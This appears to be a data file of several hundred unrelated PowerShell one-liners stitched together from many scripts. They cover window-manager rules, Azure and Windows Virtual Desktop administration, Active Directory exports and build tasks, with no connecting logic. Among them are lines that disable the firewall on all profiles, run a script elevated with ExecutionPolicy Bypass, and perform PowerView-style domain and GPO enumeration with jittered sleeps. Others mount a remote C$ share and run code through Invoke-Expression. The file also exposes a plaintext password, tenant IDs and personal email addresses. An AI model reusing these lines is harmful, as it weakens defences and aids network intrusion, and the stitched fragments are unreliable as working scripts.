Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
Import-Module -Name $targetDir -Force
Remove-Item $symlinkName -Force
New-Item -Path $symlinkName -ItemType SymbolicLink -Value $sourceDir | Out-Null
New-Item -Path $targetDir -ItemType SymbolicLink -Target $sourceDir
komorebic.exe identify-border-overflow-application class "Photoshop"
komorebic.exe identify-tray-application exe "AutoHotkeyU64.exe"
komorebic.exe float-rule exe "Bloxstrap.exe"
komorebic.exe float-rule title "Calculator"
komorebic.exe float-rule exe "CredentialUIBroker.exe"
komorebic.exe float-rule class "TApplication"
komorebic.exe float-rule class "TWizardForm"
komorebic.exe identify-border-overflow-application exe "DiscordCanary.exe"
komorebic.exe identify-border-overflow-application exe "DiscordDevelopment.exe"
komorebic.exe identify-border-overflow-application exe "DiscordPTB.exe"
komorebic.exe float-rule exe "Camera Hub.exe"
komorebic.exe float-rule exe "ControlCenter.exe"
komorebic.exe float-rule exe "WaveLink.exe"
komorebic.exe identify-border-overflow-application exe "EpicGamesLauncher.exe"
komorebic.exe identify-border-overflow-application exe "Flow.Launcher.exe"
komorebic.exe identify-border-overflow-application exe "GalaxyClient.exe"
komorebic.exe float-rule class "Chrome_RenderWidgetHostHWND"
komorebic.exe identify-border-overflow-application exe "GodotManager.exe"
komorebic.exe identify-object-name-change-application exe "idea64.exe"
komorebic.exe float-rule class "SunAwtDialog"
komorebic.exe identify-border-overflow-application exe "Kotatogram.exe"
komorebic.exe float-rule exe "LogiBolt.exe"
komorebic.exe float-rule exe "LogiOptionsUI.exe"
komorebic.exe identify-border-overflow-application exe "EXCEL.EXE"
komorebic.exe float-rule class "_WwB"
komorebic.exe identify-border-overflow-application exe "OUTLOOK.EXE"
komorebic.exe float-rule exe "MSPCManager.exe"
komorebic.exe identify-border-overflow-application exe "POWERPNT.EXE"
komorebic.exe identify-border-overflow-application exe "Teams.exe"
komorebic.exe float-rule title "Microsoft Teams Notification"
komorebic.exe float-rule title "Microsoft Teams Call"
komorebic.exe identify-border-overflow-application exe "WINWORD.EXE"
komorebic.exe identify-object-name-change-application exe "firefox.exe"
komorebic.exe float-rule class "MozillaTaskbarPreviewClass"
komorebic.exe identify-border-overflow-application exe "NVIDIA GeForce Experience.exe"
komorebic.exe identify-border-overflow-application exe "nhm_app.exe"
komorebic.exe float-rule exe "NohBoard.exe"
komorebic.exe identify-border-overflow-application exe "Notion Enhanced.exe"
komorebic.exe identify-border-overflow-application class "DocEditorsWindowClass"
komorebic.exe identify-border-overflow-application exe "Obsidian.exe"
komorebic.exe float-rule exe "Paradox Launcher.exe"
komorebic.exe float-rule exe "PowerToys.ColorPickerUI.exe"
komorebic.exe float-rule exe "PowerToys.ImageResizer.exe"
komorebic.exe identify-border-overflow-application exe "ProtonVPN.exe"
komorebic.exe float-rule exe "QuickLook.exe"
komorebic.exe float-rule exe "RoundedTB.exe"
komorebic.exe float-rule exe "sideloadly.exe"
komorebic.exe float-rule class "obj_App"
komorebic.exe float-rule class "obj_Form"
komorebic.exe float-rule class "Shell_Dialog"
komorebic.exe float-rule class "TaskManagerWindow"
komorebic.exe identify-border-overflow-application exe "Telegram.exe"
komorebic.exe float-rule exe "TranslucentTB.exe"
komorebic.exe identify-border-overflow-application exe "UnrealEditor.exe"
komorebic.exe identify-object-name-change-application exe "devenv.exe"
komorebic.exe identify-border-overflow-application exe "Code.exe"
komorebic.exe identify-border-overflow-application exe "VoiceAI.exe"
komorebic.exe manage-rule class "ConsoleWindowClass"
komorebic.exe float-rule class "OperationStatusWindow"
komorebic.exe float-rule exe "msiexec.exe"
komorebic.exe float-rule title "Hotkey sink"
komorebic.exe float-rule exe "paintdotnet.exe"
komorebic.exe float-rule exe "pinentry.exe"
Remove-Item -Path "$Env:UserProfile\Downloads\$Package"
Install-WinGetApp -PackageID "Git.Git"
Install-ScoopApp -Package "aria2"
Enable-Bucket -Bucket "extras"
Enable-Bucket -Bucket "games"
Set-StrictMode -Version Latest
New-Item -Path $Transcript -ItemType File -ErrorAction SilentlyContinue
New-LogFiles -LogDirectory $LogDirectory -LogPrefix $LogPrefix -Verbose
New-PromptObjects -PromptsObj $PromptsObj -ResponsesObj $ResponsesObj -Verbose
New-PromptObjects -Verbose
New-SelfSignedCertificate @SelfSignedCertParams -Verbose
Invoke-ApplicationWithOptions -ArgsArray $args -EnsureSuccess $false -ReturnType Output
Submit-ACMEChallenge dns01 -ChallengeType dns-01
Get-ACMECertificate mastercert -ExportKeyPEM C:\Users\guacadmin\Documents\2017-bunker011-master.pem
Import-Module ACMESharp
Submit-ACMECertificate $certname
Get-ACMECertificate $certname -ExportPkcs12 $pfxfile -CertificatePassword $CertificatePassword
Start-Sleep -s 15
Get-ChildItem -Path $FolderPath | Where-Object { $_ . Name -notlike "user*folder*" } | Enable-NTFSAccessInheritance
Add-NTFSAccess -Path $FolderPath -Account $Account -AccessRights Modify , Synchronize -AccessType Allow
Invoke-Command -ComputerName $Server -ScriptBlock { $objSchTaskService = New-Object -ComObject Schedule.Service }
Import-Module ActiveDirectory
Get-ADObject -Filter 'objectClass -eq "contact"' -SearchBase $OU -properties displayName , mail , department | Select-Object displayName , mail , department | export-csv "$ExportPath$FileName" -NoTypeInformation
Import-Module activedirectory
Move-ADObject -Identity $ObjectDN -TargetPath $TargetOU
Get-ADUser -Filter * -SearchBase $( $ADDomain . DistinguishedName ) -properties Name , samAccountName , Title , Description , Office , Enabled , AccountExpirationDate , lastLogon , WhenChanged , distinguishedName | Select-Object Name , samAccountName , Title , Description , Office , Enabled , AccountExpirationDate , @{ n = 'LastLogon' ; e = { [ DateTime ] :: FromFileTime ( $_ . LastLogon ) } } , WhenChanged , distinguishedName | export-csv "$ExportPath$FileName" -NoTypeInformation
Where-Object { $_ . Value . ParameterSets . Keys -contains $PsCmdlet . ParameterSetName } |
Where-Object { $PSBoundParameters . Keys -notcontains $_ }
Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
Set-Property $Translate 'ChaseReferral' ( 0x60 )
New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ( [ array ] )
Get-DomainGroup @SearcherArguments | ForEach-Object {
Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
Get-GptTmpl @ParseArgs | ForEach-Object {
Start-Sleep -Seconds $RandNo . Next ( ( 1 - $Jitter ) * $Delay , ( 1 + $Jitter ) * $Delay )
new-PSdrive IA Filesystem \\$PCName\C$
pip.exe install -U -r deps\requirements.txt
Remove-Item -Path $File . FullName -Force -ErrorAction Stop
Set-NetFirewallProfile -Profile Domain , Public , Private -Enabled False
Set-Service -Name "sysmain" -StartupType Disabled
Remove-Item -Path "$env:TEMP\*" -Force -Recurse
RunDll32.exe InetCpl.cpl , ClearMyTracksByProcess 255
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name UserPreferencesMask -Value 90
Run-ScriptOnComputers -ComputerNames $computerNames
Add-Type -AssemblyName System.Web
Out-File -FilePath $validation_result_path -InputObject ( "Results for validation performed on " + ( Get-Date ) )
Create-PendingCert-DataTable
Set-Window -ProcessId $app . Id -X $x -Y $y -Width $screen_width -Height $h -Passthru
C:\api\automation\Scripts\python.exe C:\api\ps1_scripts\VIPTourContentSetup01\desktop01Content.py
C:\api\automation\Scripts\python.exe C:\api\ps1_scripts\VIPTourContentSetup01\desktop02Content.py
Remove-Variable -Name Windows1607 , Windows1803 , Windows1809 , OSVer , OSBuild
Start-Sleep -Seconds 8
New-Item "$($profile | Split-Path)\Modules\AudioDeviceCmdlets" -Type directory -Force -ErrorAction SilentlyContinue
Set-Password
Enable-PSRemoting -Force
New-NetFirewallRule -Name "WinRM HTTPS" -DisplayName "WinRM HTTPS" -Enabled True -Profile Any -Action Allow -Direction Inbound -LocalPort 5986 -Protocol TCP
New-AzureStorageContainer -Name "scripts" -Context $storagecontext
Set-AzureStorageBlobContent -Container "scripts" -File $file -Blob "ConfigureWinRM_HTTPS.ps1" -Context $storagecontext -force
Set-AzureRmVMCustomScriptExtension -ResourceGroupName $ResourceGroupName -VMName $VMName -Name "EnableWinRM_HTTPS" -Location $vm . Location -StorageAccountName $storageaccountname -StorageAccountKey $key -FileName "ConfigureWinRM_HTTPS.ps1" -ContainerName "scripts" -RunFile "ConfigureWinRM_HTTPS.ps1" -Argument $DNSName
New-AzureRmResourceGroup -Name $ResourceGroupName -Location $Location # EXECUTE ONCE ONLY FOR ALL ITERATIONS
New-AzureRmVM -ResourceGroupName $ResourceGroupName -Location $Location -VM $VirtualMachine
ConvertTo-SecureString "a_Path9!!Tomakeus#Sile" -AsPlainText -Force | ` ConvertFrom-SecureString | Out-File -FilePath $passwordFile
Set-PSConsoleWriter
Get-AppXPackage *office* -allUsers | Remove-AppXPackage –allUsers
Copy-Item -Path "C:\Temp\PpkgInstaller\PpkgInstallerLog.txt" -Destination "$env:ProgramData\Airwatch\UnifiedAgent\Logs\PpkgInstallerLog.txt"
Get-ChildItem "$Depot\*.appv" -Recurse | Get-AppVManifestInfo | ? { $_ . FileTypeAssociation } | Select-Object -Property Name , FileTypeAssociation
Set-Location "c:\windows\system32\inetsrv\"
Get-AzLocation | Format-Table Location , DisplayName -AutoSize
Get-AzResourceProvider -Location "eastus"
Get-AzResourceProvider -Location "southcentralus" -ListAvailable
Get-AzResourceProvider -ListAvailable | foreach-object { Register-AzResourceProvider -ProviderNamespace $_ . ProviderNamespace }
Get-AzResourceProvider -ProviderNamespace Microsoft.Compute
Get-AzResourceProviderAction -OperationSearchString "Microsoft.Compute/register/action" | Format-Table Operation , Description -AutoSize
Get-AzResourceProviderAction -OperationSearchString "Microsoft.Compute/virtualMachines/*" | Format-Table Operation , Description -AutoSize
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile ".\ImpInfraasCode\StorageAccount.json" ` -TemplateParameterFile ".\ImpInfraasCode\StorageAccount.parameters.json"
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile ".\ImpInfraasCode\StorageAccount.json" ` -TemplateParameterFile ".\ImpInfraasCode\StorageAccount.parameters.json" ` -StorageAccountType 'Standard_GRS'
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile "$GitBasePath\\VirtualNetwork1Subnet.json"
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile "$GitBasePath\\VirtualNetwork2Subnets.json" ` -Mode Complete
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile "$GitBasePath\\StorageAccountLinked.json" ` -StorageAccountType 'Standard_LRS'
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile "$GitBasePath\\keyvaulttest.json" ` -TemplateParameterFile "$GitBasePath\\keyvaulttest.parameters.json"
New-AzResourceGroupDeployment -ResourceGroupName RG-IaCSample ` -TemplateFile "$GitBasePath\\SimpleWindowsVM.json" ` -TemplateParameterFile "$GitBasePath\\SimpleWindowsVM.parameters.json"
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol ##No run smbv1
Set-NetFirewallProfile -Name "domain" -LogMaxSizeKilobytes 10240 -LogAllowed "true" -LogBlocked "true" ##enables logs
Set-NetFirewallProfile -Name "Private" -LogMaxSizeKilobytes 10240 -LogAllowed "true" -LogBlocked "true" ##enables logs
Enable-AzMfaToken -upn $upn -serialNumber $serialNumber -Secret $content . 'Secret Key'
Get-CsTrustedApplicationEndpoint -Filter { sipaddress -like "*UCC_*" } | select Sipaddress , DisplayName , LineURI , VoicePolicy | FT -AutoSize
Set-NetConnectionProfile -InterfaceAlias "vEthernet (DockerNAT)" -NetworkCategory 'Private'
Disable-NetAdapterBinding -Name "vEthernet (DockerNAT)" -ComponentID ms_server
Set-VMSwitch -Name 'DockerNAT' -SwitchType Private -Confirm: $false
Stop-VM DockerDesktopVM -Force -Confirm: $false
Stop-Service -Name 'com.docker.service' -Confirm: $false -Force
New-CustomNetworkAclEntry -NaclId $NaclId -Connection Random -Direction Outbound
Clear-Content $AWS_CREDS
Add-Content $AWS_CREDS "[default]"
Add-Content $AWS_CONFIG "[default]"
Clear-Content $AWS_CREDS
Add-Content $AWS_CREDS "[default]"
Add-Content $AWS_CONFIG "[default]"
Import-Module -name Az
Connect-AzAccount
New-AzVm -ResourceGroupName $resourceGroup -Name $vmName -Credential $adminCredential -Image UbuntuLTS
Remove-AzResourceGroup -Name MyResourceGroupName
Export-ModuleMember -Function ( $PublicFunctions . Basename | Where-Object { $PSitem -match '^\w+-\w+$' } )
Enter-Build {
Set-Location $buildRoot
UnRegister-PackageSource -Name nuget.org -ErrorAction SilentlyContinue
Install-module -Name 'PSDepend' -Scope CurrentUser -Repository PSGallery -ErrorAction Stop -Force
Write-Build Green 'Build Initialization - Running PSDepend to Install Dependencies'
Set-BuildEnvironment -BuildOutput $BuildOutputPath -Force
Remove-Module $env:BHProjectName -erroraction silentlycontinue
Set-Location $buildRoot
Update-Metadata -Path $buildReleaseManifest -PropertyName ModuleVersion -Value $ProjectBuildVersion
Update-Metadata -Path $BuildReleaseManifest -PropertyName PreRelease -Value $ProjectPreReleaseTag
Compress-Archive -Path $BuildProjectPath -DestinationPath $ZipArchivePath -Force @PassThruParams
write-build DarkYellow "Task $($task.name) - GitHubAPIKey was not found as an environment variable or in the Windows Credential Manager. Please store it or use {Invoke-Build publish -GitHubUser `"MyGitHubUser`" -GitHubAPIKey `"MyAPIKeyString`"}. Have you created a GitHub API key with minimum public_repo scope permissions yet? https://github.com/settings/tokens"
write-build DarkYellow "Task $($task.name) - NuGetAPIKey was not found as an environment variable. Please specify it or use {Invoke-Build publish -NuGetAPIKey " MyAPIKeyString"}. Have you registered for a Powershell Gallery API key yet? https://docs.microsoft.com/en-us/powershell/gallery/psgallery/creating-and-publishing-an-item"
New-AzResourceGroup -Name $myResourceGroup -Location $location
New-AzAppServicePlan -Name $webappname -Location $location -ResourceGroupName $myResourceGroup -Tier Free
New-AzWebApp -Name $webappname -Location $location -AppServicePlan $webappname -ResourceGroupName $myResourceGroup
Set-AzContext SubscriptionName
New-AzResourceGroup ` -Name myResourceGroup ` -Location "Central US"
New-AzResourceGroupDeployment ` -Name addskuparameter ` -ResourceGroupName myResourceGroup ` -TemplateFile $templateFile ` -storageName "{your-unique-name}"
install-module az -Scope AllUsers -Force #while using mac it gives error so just installed for current user
Get-Module az -ListAvailable
Update-Module az -Scope AllUsers
Connect-AzAccount
get-command -module AZ.Compute
New-AzVm ` -ResourceGroupName 'myResourceGroup' ` -Name 'myVM' ` -Location 'East US' ` -Image 'MicrosoftWindowsServer:WindowsServer:2022-datacenter-azure-edition:latest' ` -VirtualNetworkName 'myVnet' ` -SubnetName 'mySubnet' ` -SecurityGroupName 'myNetworkSecurityGroup' ` -PublicIpAddressName 'myPublicIpAddress' ` -OpenPorts 80 , 3389
Start-Sleep -Seconds 5
Set-Location $PSScriptRoot
Get-AzSubscription
Get-AzNetworkSecurityGroup
Get-AzVirtualNetworkSubnetConfig -VirtualNetwork $VNet | Select-Object Name , AddressPrefix
Set-AzVirtualNetworkSubnetConfig -Name $VNetSubnet . Name -VirtualNetwork $VNet -AddressPrefix $VNetSubnet . AddressPrefix -NetworkSecurityGroup $nsg
Invoke-RestMethod @RestCall ;
Send-SlackMessage -Message ( 'No Slack command found in Azure Automation Runbook: {0}' -f $SlackParams . Text . Split ( ' ' ) [ 0 ] ) ;
Get-AzResourceGroup
Remove-AzResourceGroup -Name "YourRGName"
Get-AzResourceGroup | Where-Object -FilterScript { $PSItem . ResourceGroupName -eq 'azlocalteste' } |
Get-AzVM
Set-Item -LiteralPath $path -Value ( Read-Host -Prompt $description )
Set-Item -LiteralPath "Env:$variableKey" -Value ''
Write-SetVariable -Name $Name -Value $Value -Secret: $Secret
New-Object regex -ArgumentList "^$Pattern`$" , ( [ System.Text.RegularExpressions.RegexOptions ] :: IgnoreCase )
Get-PathIterator -Path $pathPrefix -Filter $fileNameFilter -IncludeFiles: $IncludeFiles -IncludeDirectories: $IncludeDirectories -Force: $Force |
New-Object psobject -Property @{ Token = ';' ; Replacement = '%3B' }
Export-ModuleMember -Function @(
Get-Module PowerShellGet -list | Select-Object Name , Version , Path
Install-Module AzureRM
Login-AzureRmAccount
Login-AzureRmAccount -TenantId $MyTenantID
Get-AzureRmSubscription
Select-AzureRmSubscription -SubscriptionName "$SubscriptionName"
Get-AzureRmContext
Get-AzureRmVM
Get-AzureRmResourceGroup
Login-AzureRmAccount
Get-AzureRmStorageAccount -ResourceGroupName "<Resource Group Name>" -AccountName < storage account name>
Get-AzureRMRoleAssignment -Scope "<the long id of the storage account>"
Get-AzureRmRoleDefinition | foreach-Object { Get-AzureRmRoleDefinition $_ . Name } | select Name , Actions | Where-Object { $_ . Actions -like '*Microsoft.Insights/activityLogAlerts*' }
Get-AzureRmRoleDefinition
New-AzureRmRoleAssignment -ObjectId < object id of user> -RoleDefinitionName "Custom Security Role" -Scope /subscriptions/<subscription id>
Get-AzureRmADUser -? #for help
Get-AzureRmADUser
Get-AzureRmADUser -UserPrincipalName { UserPrincipalName }
Get-AzureRmADUser -ObjectID < string>
Get-AzureRmADUser -StartsWith "<string>"
Get-AzureRmADUser | where UserPrincipalName -like "*<substring>*"
Get-AzureADUser -filter "UserPrincipalName eq '<UPN>'" | Get-AzureADUserMembership | select DisplayName
Get-AzureRmADServicePrincipal
Get-AzureRmADServicePrincipal | where DisplayName -like "*<search string>*"
Get-AzureADDirectoryRole | Where-Object { $_ . displayName -eq 'Company Administrator' } | Select-Object -Property ObjectId | Get-AzureADDirectoryRoleMember -ObjectId { $_ . objectId }
Get-AzureRmADGroup | ft
Get-AzureRmADGroup | where DisplayName -like "*<substring>*"
Get-AzureRmADGroupMember -GroupDisplayName < group name>
New-AzureRmNetworkSecurityGroup -Name "NSGFrontEnd" -Location $Location -ResourceGroupName $RGName -SecurityRules $NSGRule1 #could use array of rules or separate by comma, e.g. rule1, rule2
Add-AzureRmNetworkSecurityRuleConfig -NetworkSecurityGroup $NSG -name 'RDP' -Direction Inbound -Priority 101 ` -Access Allow -SourceAddressPrefix 'INTERNET' -SourcePortRange '*' ` -DestinationAddressPrefix '*' -DestinationPortRange '3389' -Protocol Tcp
Get-AzureRmNetworkSecurityGroup -name "NSGFrontEnd" -ResourceGroupName $RGName | Remove-AzureRmNetworkSecurityRuleConfig -Name 'RDP' |
Select-AzureSubscription -SubscriptionName $SourceSubscription
Select-AzureSubscription -SubscriptionName $DestSubscription
Invoke-Command -Session $Session -ScriptBlock {
Select-AzureSubscription -subscriptionName $SourceSubscription | Out-Null
Select-AzureSubscription -subscriptionName $DestSubscription | Out-Null
Invoke-Pester -Script "$PSScriptRoot"
Get-AzRoleDefinition Owner
Connect-AzAccount
New-AzRoleDefinition -InputObject $roleDefinition
New-AzureADUser -AccountEnabled $True -DisplayName "Ismet Dumlupinar" -PasswordProfile $AzAdPwdProfile -MailNickName "idumlupinar" -UserPrincipalName "idumlupinar@clarosdevops.com"
Publish-AzWebApp -ResourceGroupNam < groupName> -Name < webAppName> -ArchivePath < path-to-zip-file>.zip
Set-Item -LiteralPath $path -Value ( Read-Host -Prompt $description )
Set-Item -LiteralPath "Env:$variableKey" -Value ''
Write-SetVariable -Name $Name -Value $Value -Secret: $Secret
New-Object regex -ArgumentList "^$Pattern`$" , ( [ System.Text.RegularExpressions.RegexOptions ] :: IgnoreCase )
Get-PathIterator -Path $pathPrefix -Filter $fileNameFilter -IncludeFiles: $IncludeFiles -IncludeDirectories: $IncludeDirectories -Force: $Force |
New-Object psobject -Property @{ Token = ';' ; Replacement = '%3B' }
Assert-Agent -Minimum '2.105.7'
Assert-Agent -Minimum '2.122.0'
Export-ModuleMember -Function @(
Get-Content $referencesFilePath | ForEach-Object { $_ -replace $fileNamePattern , $newFileName } > $referencesTempFilePath
Copy-Item $referencesTempFilePath $referencesFilePath -Force
Get-Content $referencesFilePath | ForEach-Object { if ( -not ( $_ -match $fileNamePattern ) ) { $_ } } > $referencesTempFilePath
AddOrUpdate-Reference $scriptsFolderProjectItem $jqueryFileNameRegEx $jqueryFileName
Delete-ProjectItem $intelliSenseFileProjectItem
Read-Host -Prompt "Enter your password for $($LoginName)" -assecurestring | convertfrom-securestring | out-file $SecurePasswordLocation
Get-AzVMImageOffer -Location $loc -PublisherName "Canonical"
Get-AzVMImageSku -Location $loc -PublisherName "Canonical" -Offer "0001-com-ubuntu-server-focal"
Get-AzVMImage -Location $loc -PublisherName "Canonical" -Offer "0001-com-ubuntu-server-focal" -Skus "20_04-lts" | Select-Object -Last 1
Connect-AzAccount
Select-AzSubscription -SubscriptionId $subscription
Set-AzVMOSDisk -VM $VMSettings -Name $OSDiskName -Linux -DiskSizeInGB 80 -CreateOption FromImage
Add-AzVMDataDisk -VM $VMSettings -Name $DataDiskName -DiskSizeInGB 100 -CreateOption Empty -Lun 1
Get-AzVMImagePublisher -Location $loc | Select-Object -First 10
Get-AzVMImage -Location $loc
Get-RdsTenant
Get-RdsHostPool -TenantName "wvd-adf-demo"
Get-RdsSessionHost -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp"
Get-RdsAppGroup -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp"
Get-RdsAppGroupUser -TenantName "wvd-adf-demo" -HostPoolName "wvdhp" -AppGroupName "Desktop Application Group" | Format-Table -AutoSize
Add-RdsAppGroupUser -TenantName "wvdadtenant" -HostPoolName "hostpool1" -AppGroupName "Desktop Application Group" -UserPrincipalName < userupn>
Remove-RdsAppGroupUser -TenantName "wvdadtenant" -HostPoolName "hostpool1" -AppGroupName "Desktop Application Group" -UserPrincipalName & lt ; upn>
New-RdsAppGroup -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -Name adfapp -ResourceType "RemoteApp"
Get-RdsStartMenuApp -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -AppGroupName adfapp
New-RdsRemoteApp -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -AppGroupName "adfapp" -Name Adfpaint -AppAlias paint
New-RdsRemoteApp -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -AppGroupName adfapp ` -Name Adfwordpad ` -Filepath "C:\Program Files\Windows NT\Accessories\wordpad.exe" ` -IconPath "C:\Program Files\Windows NT\Accessories\wordpad.exe" ` -IconIndex 0
Get-RdsRemoteApp -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -AppGroupName adfapp
Add-RdsAppGroupUser -TenantName "wvd-adf-demo" -HostPoolName "wvdhpapp" -AppGroupName adfapp -UserPrincipalName roletest@adfolks.com
New-ItemProperty -Path "HKLM:\SOFTWARE\FSLogix\Profiles" -Name "VHDLocations" -Value "\\wvdadf.file.core.windows.net\wvdadfshare" -PropertyType "MultiString" -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\FSLogix\Profiles' -Name 'Enabled' -Value '0'
Import-Module -Name Microsoft.RDInfra.RDPowerShell
Update-Module -Name Microsoft.RDInfra.RDPowerShell
Install-Module AzureAD
Import-Module AzureAD
Add-RdsAccount -DeploymentUrl "https://rdbroker.wvd.microsoft.com"
https://blog.itprocloud.de/Windows-Virtual-Desktop-Admin/
New-RdsTenant -Name "vdi-test-us" -AadTenantId a86bc255-9bb7-4ee8-b30a-51fba84872aa -AzureSubscriptionId e33f0471-ef78-4f7e-97cf-fe9efebf11e0
Remove-RdsTenant -Name "vdi-test-us"
Remove-RdsHostPool -TenantName "vdi-test-us" -Name "vdihp"
Remove-RdsAppGroup -TenantName "vdi-test-us" -HostPoolName "vdihp" -AppGroupName "Desktop Application Group"
New-RdsRegistrationInfo -TenantName "vdi-test-us" -HostPoolName "vdihp" -ExpirationHours 3 | Select-Object -ExpandProperty Token
Add-RdsAccount -DeploymentUrl "https://rdbroker.wvd.microsoft.com"
New-RdsHostPool -TenantName wvd-adf-demo -Name wvdhp
https://docs.microsoft.com/en-us/azure/virtual-desktop/create-host-pools-powershell#register-the-virtual-machines-to-the-windows-virtual-desktop-host-pool
Get-RdsHostPool -TenantName "wvd-adf-demo"
Get-RdsSessionHost -TenantName "wvd-adf-demo" -HostPoolName "wvdhp"
Get-RdsAppGroup -TenantName "wvd-adf-demo" -HostPoolName "wvdhp"
Add-RdsAppGroupUser -TenantName wvd-adf-demo -HostPoolName wvdhp -AppGroupName "Desktop Application Group" -UserPrincipalName arathy.r@adfolks.com
https://aka.ms/fslogix_download
Remove-RdsSessionhost -TenantName "wvdadtenant" -HostPoolName "hostpool1" -Name "hostpool1-1.adfolks.com"
New-RdsRoleAssignment -TenantName "vdi-test-us" -SignInName arjun.n@adfolks.com -RoleDefinitionName "RDS Owner"
Add-RdsAppGroupUser wvd-adf-demo wvdhp "Desktop Application Group" -UserPrincipalName arathy.r@adfolks.com
Set-RdsSessionHost -TenantName "wvd-adf-demo" -HostPoolName "wvdhp" -Name "wvdhp-1.adfolks.com" -AllowNewSession $false
Get-RdsUserSession -TenantName "wvd-adf-demo" -HostPoolName "wvdhp"
Disconnect-RdsUserSession -TenantName "wvdadtenant" -HostPoolName "hostpool1" -SessionHostName "hostpool1-1.adfolks.com" -SessionId 3
Invoke-RdsUserSessionLogoff -TenantName "wvdadtenant" -HostPoolName "hostpool1" -SessionHostName "hostpool1-1.adfolks.com" -SessionId 3
Get-RdsUserSession -TenantName "wvdadtenant" -HostPoolName "hostpool1" | where { $_ . UserPrincipalName -eq "rahul@adfolks.com" } | Invoke-RdsUserSessionLogoff -NoUserPrompt
Set-RdsHostPool -TenantName "wvdadtenant" -HostPoolName "hostpool1" -BreadthFirstLoadBalancer -MaxSessionLimit ###
Set-RdsHostPool -TenantName "wvdadtenant" -HostPoolName "hostpool1" -DepthFirstLoadBalancer -MaxSessionLimit ###
Set-RdsHostPool -TenantName "wvdadtenant" -HostPoolName "hostpool1" -AssignmentType Direct
Set-RdsSessionHost -TenantName "wvdadtenant" -HostPoolName "hostpool1" -Name < sessionhostname> -AssignedUser < userupn>
Invoke-AzureRmVMRunCommand -ResourceGroupName $ResourceGroup . ResourceGroupName -VMName $_ . Name -CommandId 'RunPowerShellScript' -ScriptPath qcainstall.ps1 -Parameter @{ "ActivationId" = "REPLACE_ME" ; "CustomerId" = "REPLACE_ME" } -Confirm: $false
Invoke-AzureRmVMRunCommand -ResourceGroupName $ResourceGroup . ResourceGroupName -VMName $_ . Name -CommandId 'RunShellScript' -ScriptPath qcainstall.sh -Parameter @{ "ActivationId" = "REPLACE_ME" ; "CustomerId" = "REPLACE_ME" ; "url_rpm" = "REPLACE_ME" ; "url_deb" = "REPLACE_ME" } -Confirm: $false
Connect-AzureRmAccount
New-AzureRmResourceGroup ` -Name 'myrg' ` -Location 'Centralus'
Get-AzureRmVMImageSku -Location $rg . Location -PublisherName "Redhat" -Offer "rhel"
New-AzureRmVM ` -ResourceGroupName $rg . ResourceGroupName ` -Location $rg . Location ` -VM $LinuxVmConfig
New-Item -Path $Logs -ItemType directory > $null 2>&1
powershell.exe $trimmedproc "$application" $website
Set-Acl "c:\temp\test.txt" $acl
Invoke-Build Deploy {
Remove-Variable -Name Resources -Scope Local -Force -ErrorAction Ignore
sc.exe config $_ . Name --% start=delayed-auto
Get-ChildItem -Path $Path -Filter *.* -Include *.btm , *.btp , *.xsd -Recurse |
Get-ChildItem -Path ( [ System.IO.Path ] :: Combine ( $projectPath , 'bin' , $Configuration , $targetFramework ) ) ` -Filter "$($outputAssemblyName).*" ` -Include *.dll , *.exe ` -Recurse -Depth 0
Set-Alias -Option ReadOnly -Name $_ -Value $toolPath ` -Scope $( if ( $Scope -eq 'Local' ) { 1 } else { $Scope } ) ` -Force: $Force ` -Verbose: ( $PSBoundParameters [ 'Verbose' ] -eq $true )
Merge-HashTable -HashTable @{ Name = Split-Path -Path $_ . ProviderPath -Leaf ; Path = $_ . ProviderPath } , $currentItem
Merge-HashTable -HashTable @{ Name = $_ } , $currentItem
Invoke-ScriptBlock -ScriptBlock $scriptBlock -Parameters $PSBoundParameters |
Add-Member -InputObject $item -MemberType ScriptMethod -Name $_ -Value $Members . $_
Download-File 'https://chocolatey.org/7za.exe' "$7zaExe"
Invoke-ProcessAssets $assets $AssetsSourcePath $targetPath $AssetsTransformPath $transformationsSourcePath
Invoke-Expression -Command $Global:ModuleLoader . ToString ( )
New-BTAppId
SafelyClear-Host
List-AppRequirements
Invoke-Logger "Invoking any Pre-Startup Actions (if applicable)"
Invoke-Logger ( "Invoking any Post-Startup Actions (if applicable)" )
Show-Banner
Add-Member MemberSet PSStandardMembers $display -Passthru
Check-DriveSpace $DownloadDirectory -ObjSize $BoxSizeInMB
Export-ModuleMember Import-VagrantBox
Set-Content -Path $pluginFile -Value "PSHOMEDIR=$targetPsHomeDir" -ErrorAction Stop
Copy-Item $targetPsHome\pwrshplugin.dll $resolvedPluginAbsolutePath -Force -Verbose -ErrorAction Stop
Register-WinRmPlugin $pluginPath $pluginEndpointName
Invoke-Logger $( $ExecutionContext . InvokeCommand . ExpandString ( $( Derive-i18nString info.check_global_init ) ) )
Invoke-Logger $( $ExecutionContext . InvokeCommand . ExpandString ( $( Derive-i18nString info.unsupported ) ) ) -Logfiles $MachineObj . logfile
New-ModuleManifest @newModuleManifestParams
Import-Module -Name ( Join-Path -Path $PSScriptRoot -ChildPath 'MetaFixers.psm1' ) -Verbose: $false -Force
Write-Progress -Activity "Compress-Archive" -Completed
New-Item $currentArchiveEntryFileInfo . DirectoryName -Type Directory -Confirm: $isConfirm | Out-Null
Unload-SUT
Export-ModuleMember -Function *-*
